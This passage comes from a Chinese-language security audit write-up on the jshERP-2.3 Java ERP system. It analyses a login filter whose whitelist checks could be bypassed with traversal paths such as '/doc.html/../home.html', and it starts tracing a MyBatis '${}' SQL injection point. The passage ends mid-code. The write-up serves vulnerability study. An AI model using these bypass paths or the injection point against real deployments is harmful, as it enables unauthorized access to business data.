style="color: #E06C75"> </span><span style="color: #98C379">&quot;ignoredUrl&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">value</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;.css#.js#.jpg#.png#.gif#.ico&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #E06C75">                      </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebInitParam</span><span style="color: #E06C75">(</span><span style="color: #D19A66">name</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;filterPath&quot;</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #E06C75">                              </span><span style="color: #D19A66">value</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;/user/login#/user/registerUser#/v2/api-docs&quot;</span><span style="color: #E06C75">)})</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">LogCostFilter</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Filter</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">final</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> FILTER_PATH </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;filterPath&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">final</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> IGNORED_PATH </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;ignoredUrl&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">final</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">List</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> ignoredList </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ArrayList</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] allowUrls</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] ignoredUrls</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> init</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">FilterConfig</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">filterConfig</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">filterPath</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">filterConfig</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInitParameter</span><span style="color: #ABB2BF">(FILTER_PATH);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">StringUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isEmpty</span><span style="color: #ABB2BF">(filterPath)) {</span></span><span class="line"><span style="color: #ABB2BF">            allowUrls </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">filterPath</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">contains</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;#&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">filterPath</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">split</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;#&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{filterPath};</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ignoredPath</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">filterConfig</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInitParameter</span><span style="color: #ABB2BF">(IGNORED_PATH);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">StringUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isEmpty</span><span style="color: #ABB2BF">(ignoredPath)) {</span></span><span class="line"><span style="color: #ABB2BF">            ignoredUrls </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ignoredPath</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">contains</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;#&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ignoredPath</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">split</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;#&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{ignoredPath};</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ignoredUrl</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> ignoredUrls) {</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">ignoredList</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">add</span><span style="color: #ABB2BF">(ignoredUrl);</span></span><span class="line"><span style="color: #ABB2BF">            }</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doFilter</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">ServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">                         </span><span style="color: #E5C07B">FilterChain</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">chain</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">servletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (HttpServletRequest) request;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HttpServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">servletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (HttpServletResponse) response;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">requestUrl</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">servletRequest</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRequestURI</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//具体，比如：处理若用户未登录，则跳转到登录页</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">userInfo</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">servletRequest</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getSession</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getAttribute</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(userInfo</span><span style="color: #56B6C2">!=</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) { </span><span style="color: #7F848E; font-style: italic">//如果已登录，不阻止</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(request, response);</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (requestUrl </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">requestUrl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">contains</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/doc.html&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">||</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">requestUrl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">contains</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/register.html&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">||</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">requestUrl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">contains</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/login.html&quot;</span><span style="color: #ABB2BF">))) {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(request, response);</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">verify</span><span style="color: #ABB2BF">(ignoredList, requestUrl)) {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(servletRequest, response);</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> allowUrls </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">allowUrls</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&gt;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">url</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> allowUrls) {</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">requestUrl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">startsWith</span><span style="color: #ABB2BF">(url)) {</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(request, response);</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">                }</span></span><span class="line"><span style="color: #ABB2BF">            }</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">servletResponse</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">sendRedirect</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/login.html&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> regexPrefix </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;^.*&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> regexSuffix </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;.*$&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">boolean</span><span style="color: #61AFEF"> verify</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">List</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75; font-style: italic">ignoredList</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">url</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">regex</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> ignoredList) {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Pattern</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">pattern</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Pattern</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">compile</span><span style="color: #ABB2BF">(regexPrefix </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> regex </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> regexSuffix);</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Matcher</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">matcher</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pattern</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">matcher</span><span style="color: #ABB2BF">(url);</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">matcher</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">matches</span><span style="color: #ABB2BF">()) {</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">            }</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> destroy</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><ol><li><p>我们需要去到<code>doFilter()</code>方法中去看</p><ul><li><p>从session中提取user 参数的值，如果不为null，则跳过认证，这里是没有问题的</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">//具体，比如：处理若用户未登录，则跳转到登录页</span></span><span class="line"><span style="color: #abb2bf">Object userInfo = servletRequest.getSession().getAttribute(&quot;user&quot;);</span></span><span class="line"><span style="color: #abb2bf">        if(userInfo!=null) { //如果已登录，不阻止</span></span><span class="line"><span style="color: #abb2bf">            chain.doFilter(request, response);</span></span><span class="line"><span style="color: #abb2bf">            return;</span></span><span class="line"><span style="color: #abb2bf">        }</span></span></code></pre></div></div></figure></li><li><p>如果访问的url 中包含 <code>/doc.html</code>、<code>/register.html</code>、<code>/login.html</code>，这些字符串，则不进行认证</p><p><strong>（如果url 长这样呢：<code>/doc.html/../home.html</code>，怕会出现未授权访问）（不严谨！！！）</strong></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">if (requestUrl != null &amp;&amp; (requestUrl.contains(&quot;/doc.html&quot;) ||</span></span><span class="line"><span style="color: #abb2bf">    requestUrl.contains(&quot;/register.html&quot;) || requestUrl.contains(&quot;/login.html&quot;))) {</span></span><span class="line"><span style="color: #abb2bf">    chain.doFilter(request, response);  // 请求以上URL，均不阻止</span></span><span class="line"><span style="color: #abb2bf">    return;</span></span><span class="line"><span style="color: #abb2bf">}</span></span></code></pre></div></div></figure></li><li><p>访问<code>.css、.js、.jpg、.png、.gif、.ico、/user/login、/user/registerUser、/v2/api-docs</code>这些内容的时候也不需要认证</p><p><strong>（<code>.css/../home.html</code>，同样存在未授权）（也不严谨！！！）</strong></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">if (verify(ignoredList, requestUrl)) {</span></span><span class="line"><span style="color: #abb2bf">    chain.doFilter(servletRequest, response);</span></span><span class="line"><span style="color: #abb2bf">    return;</span></span><span class="line"><span style="color: #abb2bf">}</span></span><span class="line"><span style="color: #abb2bf">if (null != allowUrls &amp;&amp; allowUrls.length &gt; 0) {</span></span><span class="line"><span style="color: #abb2bf">    for (String url : allowUrls) {</span></span><span class="line"><span style="color: #abb2bf">        if (requestUrl.startsWith(url)) {</span></span><span class="line"><span style="color: #abb2bf">            chain.doFilter(request, response);</span></span><span class="line"><span style="color: #abb2bf">            return;</span></span><span class="line"><span style="color: #abb2bf">        }</span></span><span class="line"><span style="color: #abb2bf">    }</span></span><span class="line"><span style="color: #abb2bf">}</span></span></code></pre></div></div></figure></li><li><p>最后如果用户没有权限，则跳转到登录页</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">servletResponse.sendRedirect(&quot;/login.html&quot;);</span></span></code></pre></div></div></figure></li></ul></li></ol><ul><li><p>总结：</p><p>在代码中存在四种判断方式：</p><ul><li>如果已经登录，直接放行</li><li>看URL中是否包含特定路径，包含则放行</li><li>使用<code>verify()</code>方法验证URL，验证通过则放行</li><li>使用以特定字符开头的URL路径则放行</li></ul></li></ul><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ol><li><p>检查到了Mybatis组件</p><p>所以搜索关键字为：<code>$&#123;</code> ，文件尽量查找跟用户有关的操作，并且查询的是**.xml文件**</p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165024557.png" style="zoom:25%;" /><p>jshERP-2.3\src\main\resources\mapper_xml\UnitMapperEx.xml</p></li></ol><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;selectByConditionUnit&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">parameterType</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;com.jsh.erp.datasource.entities.UnitExample&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">resultMap</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;com.jsh.erp.datasource.mappers.UnitMapper.BaseResultMap&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">        select *</span></span><span class="line"><span style="color: #ABB2BF">        FROM jsh_unit</span></span><span class="line"><span style="color: #ABB2BF">        where 1=1</span></span><span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">if</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">test</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;name != null&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">            and name like &#39;%${name}%&#39;</span></span><span class="line"><span style="color: #ABB2BF">        &lt;/</span><span style="color: #E06C75">if</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">        and ifnull(delete_flag,&#39;0&#39;) !=&#39;1&#39;</span></span><span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">if</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">test</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;offset != null and rows != null&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">            limit #{offset},#{rows}</span></span><span class="line"><span style="color: #ABB2BF">        &lt;/</span><span style="color: #E06C75">if</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><ol start="2"><li><p>回溯搜索<code>selectByConditionUnit</code>，只有一个接口和一个用法</p><p>jshERP-2.3\src\main\java\com\jsh\erp\service\unit\UnitService.java</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">List</span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">Unit</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">select</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> name</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> offset</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> rows)throws Exception {</span><span style="color: #7F848E; font-style: italic">//用法</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">List</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Unit</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> list</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">try</span><span style="color: #E06C75">{</span></span><span class="line"><span style="color: #E06C75">            list</span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">unitMapperEx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">selectByConditionUnit</span><span style="color: #ABB2BF">(name, offset, rows);</span><span style="color: #7F848E; font-style: italic">//接口</span></span><span class="line"><span style="color: #E06C75">        }</span><span style="color: #C678DD">catch</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Exception</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">){</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">JshException</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readFail</span><span style="color: #ABB2BF">(logger, e);</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> list</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li><li><p>寻找参数变量（注意：有些<code>name</code>发生转化，由传递过来的map 控制name 的值）</p><p>先到select</p><p>jshERP-2.3\src\main\java\com\jsh\erp\service\unit\UnitService.java</p><ul><li><p><strong>由传递过来的map 控制name 的值</strong></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">List</span><span style="color: #56B6C2">&lt;</span><span style="color: #C678DD">?</span><span style="color: 